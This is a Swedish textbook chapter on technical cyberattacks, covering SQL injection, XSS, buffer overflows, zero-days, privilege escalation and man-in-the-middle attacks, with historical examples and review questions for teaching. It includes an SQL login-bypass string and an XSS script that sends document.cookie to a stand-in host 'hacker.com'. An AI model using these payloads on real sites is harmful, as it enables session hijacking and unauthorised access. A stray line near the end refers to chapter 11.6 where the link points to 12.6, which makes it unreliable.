---
layout: default
title: "12.5 Tekniska angrepp: Från Webb till Kod"
parent: "Datorteknik"
nav_order: 1205
---

# 12.5 Tekniska angrepp: Från Webb till Kod

När en angripare har genomfört sin rekognosering och samlat in information, går attacken in i en teknisk fas där sårbarheter i mjukvara utnyttjas. Tekniska angrepp handlar om att hitta brister i hur ett program tar emot, bearbetar eller lagrar data. Genom att skicka speciellt utformad indata kan en angripare lura systemet att lämna ifrån sig känslig information eller köra helt egen, skadlig kod.

### 12.5.1 Injection: SQL-injection och Cross-Site Scripting (XSS)

Injection-attacker uppstår när ett program inte skiljer på instruktioner och användardata.

SQL-injection (SQLi): Detta sker när en angripare injicerar databasfrågor i ett inmatningsfält (t.ex. ett sökfält eller ett inloggningsformulär). Om webbplatsen inte filtrerar indatan kan angriparen "prata" direkt med databasen. Detta kan användas för att dumpa hela kundregister, radera tabeller eller logga in som administratör utan lösenord.

Ett klassiskt exempel på SQLi är vid en inloggningsruta. Istället för ett användarnamn skriver angriparen: ' OR '1'='1. Om koden bakom sidan ser ut så här: SELECT * FROM users WHERE username = '$user' AND password = '$password', så blir den resulterande frågan till databasen: SELECT * FROM users WHERE username = '' OR '1'='1'. Eftersom '1'='1' alltid är sant, kommer databasen att godkänna inloggningen och ofta släppa in angriparen som den första användaren i tabellen, vilket vanligtvis är administratören.

År 2011 drabbades Sony Pictures av en massiv SQL-injection-attack utförd av gruppen LulzSec. Genom att utnyttja bristfällig filtrering i deras webbformulär kunde angriparna extrahera personuppgifter, lösenord och e-postadresser tillhörande över en miljon användare.

Cross-Site Scripting (XSS): Här injicerar angriparen skadliga skript (ofta JavaScript) i en webbsida som sedan körs i offrets webbläsare. Syftet är ofta att stjäla sessions-cookies för att kapa någons inloggning eller dirigera om användaren till en falsk webbplats.

En angripare kan lämna en kommentar på en blogg som innehåller skadlig kod istället för text, exempelvis: <script>fetch('https://hacker.com/steal?cookie=' + document.cookie);</script>. Varje gång en annan användare (eller administratören) läser kommentaren, körs skriptet i deras webbläsare. Webbläsaren skickar då användarens sessions-cookie till angriparens server, vilket gör att angriparen kan ta över deras inloggade session utan att veta lösenordet.

Ett av de mest kända exemplen är Samy-masken på MySpace (2005). Genom en XSS-sårbarhet skapades en mask som automatiskt lade till "Samy" som vän och kopierade koden till besökarens egen profil. På mindre än 20 timmar hade över en miljon användare infekterats, vilket gjorde det till en av de snabbast spridda skadliga koderna någonsin.

### 12.5.2 Buffer Overflow: Att spräcka minnets gränser

Ett mer avancerat tekniskt angrepp är en så kallad Buffer Overflow, vilket riktar sig direkt mot hur datorns arbetsminne (RAM) hanteras av ett program. När en utvecklare skapar ett program reserverar hen ofta en bestämd mängd utrymme, en "buffer", för att lagra data temporärt – till exempel ett användarnamn som skrivs in i ett formulär. Om programmet är dåligt programmerat och inte kontrollerar att den indata som skickas faktiskt får plats i det reserverade utrymmet, uppstår en sårbarhet.

En angripare kan då skicka medvetet överdriven mängd data som flödar över minnesbuffertens gränser och skriver över intilliggande delar av minnet. Genom att vara extremt noggrann med vilken data som skickas kan angriparen skriva över den del av minnet som kallas för Return Address. Denna adress talar om för datorns processor vilken instruktion som ska köras härnäst. Genom att peka om denna adress till en plats i minnet där angriparen har placerat sin egen skadliga kod, så kallad shellcode, kan hen tvinga datorn att utföra kommandon med samma rättigheter som det sårbara programmet.

Ett konkret exempel på hur detta kan se ut är om ett program förväntar sig ett namn på max 50 tecken, men angriparen skickar 200 tecken bestående av skräpdata följt av en specifik minnesadress. När programmet kraschar försöker det "återvända" till den inskickade adressen istället för till sin normala kod. Denna teknik ligger bakom några av historiens mest kända cyberattacker. Ett exempel är masken Code Red från 2001, som utnyttjade en Buffer Overflow i Microsofts webbserverprogramvara (IIS). Genom att skicka en lång sträng av bokstaven 'N' till en specifik tjänst kunde masken infektera hundratusentals servrar på bara några timmar och användas för att genomföra överbelastningsattacker mot bland annat Vita husets webbplats.

### 12.5.3 Zero-day Exploits och Privilege Escalation

En av de mest fruktade termerna inom cybersäkerhet är en Zero-day. Detta är en sårbarhet i en mjukvara eller hårdvara som är helt okänd för tillverkaren. Namnet kommer från det faktum att utvecklarna har haft "noll dagar" på sig att skapa en säkerhetsuppdatering eller "patch" sedan felet upptäcktes av utomstående. Dessa sårbarheter är extremt värdefulla på den svarta marknaden eftersom de fungerar som en digital huvudnyckel som inget försvar ännu har hunnit förbereda sig på. Ett av de mest kända exemplen i modern tid är Stuxnet, en mask som utnyttjade inte mindre än fyra olika Zero-day sårbarheter i Windows för att infektera och fysiskt sabotera iranska kärnkraftsanläggningar.

När en angripare väl har tagit sig in i ett system, sker det ofta genom en profil med begränsade rättigheter, till exempel en vanlig användare eller en webbtjänst. För att kunna göra verklig skada behöver angriparen högre behörighet, vilket leder till nästa steg i kedjan: Privilege Escalation (behörighetseskalering). Detta handlar om att hitta svagheter i operativsystemets kärna eller felkonfigurerade tjänster för att "klättra" i rättighetsträdet. Målet är oftast att bli root på Linux eller System/Administrator på Windows. Med dessa rättigheter kan angriparen avaktivera antivirusprogram, installera dolda bakdörrar och röra sig fritt till andra delar av nätverket.

### 12.5.4 Man-in-the-Middle (MITM) och Spoofing

Dessa attacker riktar sig inte mot koden i sig, utan mot förtroendet i kommunikationen mellan två parter. Vid en Man-in-the-Middle-attack lyckas angriparen placera sig osynligt mellan två kommunicerande enheter, till exempel mellan din dator och din bank. Detta sker ofta i osäkra trådlösa nätverk där angriparen kan tvinga trafiken att gå via sin egen maskin. På så sätt kan hen avlyssna inloggningsuppgifter eller till och med manipulera innehållet i trafiken i realtid utan att någon av parterna märker något.

För att lyckas med sådana attacker används ofta Spoofing, vilket innebär att angriparen förfalskar sin digitala identitet för att lura ett system att lita på dem. Genom att imitera en betrodd IP-adress eller förfalska svar från en DNS-server kan angriparen dirigera om trafik till sina egna servrar. Ett historiskt exempel på detta är när angripare använde DNS-spoofing för att dirigera om besökare från stora sociala medier-plattformar till sidor som visade politiska budskap. Genom att kontrollera adressboken på internet (DNS) kunde de lura miljoner användare att deras webbläsare faktiskt var på rätt plats, trots att de hamnat i angriparens fälla.

### Kontrollfrågor

Vad är den grundläggande principen bakom en injection-attack?

Hur kan en SQL-injection leda till att en angripare loggar in utan lösenord?

Vilken roll spelar JavaScript i en Cross-Site Scripting (XSS) attack?

Beskriv vad som händer rent fysiskt i datorns minne vid en Buffer Overflow.

Vad är "shellcode" och vad används det till?

Varför anses Zero-day sårbarheter vara så farliga för en organisation?

Vad är målet med Privilege Escalation efter att en angripare har tagit sig in i ett system?

Förklara hur en Man-in-the-Middle-attack fungerar i ett oskyddat nätverk.

Vad innebär IP-spoofing och vad är syftet med det?

Vilken är den viktigaste defensiva åtgärden för att förhindra de flesta injection-attacker?

### Fördjupningslänkar

OWASP Top 10 (Den officiella listan över de mest kritiska säkerhetsriskerna för webbapplikationer) - https://owasp.org/www-project-top-ten/

PortSwigger Academy (Interaktiva labbar för att lära sig SQL-injection och XSS i praktiken) - https://portswigger.net/web-security/sql-injection

Exploit Database (Ett arkiv med riktiga exploits för att förstå hur koden ser ut) - https://www.exploit-db.com/

Computerphile (Video som förklarar Buffer Overflow på ett pedagogiskt sätt) - https://www.youtube.com/watch?v=1S0aKyirvuo

CVE Mitre (Den officiella listan över offentligt kända sårbarheter och Zero-days) - https://cve.mitre.org/

Cloudflare (Teknisk genomgång av Man-in-the-Middle-attacker och hur de stoppas) - https://www.cloudflare.com/learning/security/threats/man-in-the-middle-attack/

TryHackMe (Praktiska rum för att öva på Privilege Escalation i Windows och Linux) - https://tryhackme.com/path/outline/privesc

Microsoft Security (Information om hur man skyddar mjukvara mot minnesrelaterade sårbarheter) - https://learn.microsoft.com/en-us/windows/security/threat-protection/

First.org (Dokumentation om hur sårbarheter poängsätts tekniskt) - https://www.first.org/cvss/

CISA (Katalog över kända och utnyttjade sårbarheter i världen) - https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### Egna anteckningar

(Reflektera över varför det är så svårt att skriva helt säker kod. Varför tror du att sårbarheter som SQL-injection fortfarande är vanliga trots att de har varit kända i decennier?)

Här är det fullständiga och slutgiltiga kapitlet 11.6 Trådlös säkerhet (WLAN-hacking), sammanställt med alla delar vi har arbetat fram i sin helhet.

---
**Nästa kapitel:** [12.6 Trådlös säkerhet (WLAN-hacking)](12.06_Tradlos_sakerhet_WLANhacking.md)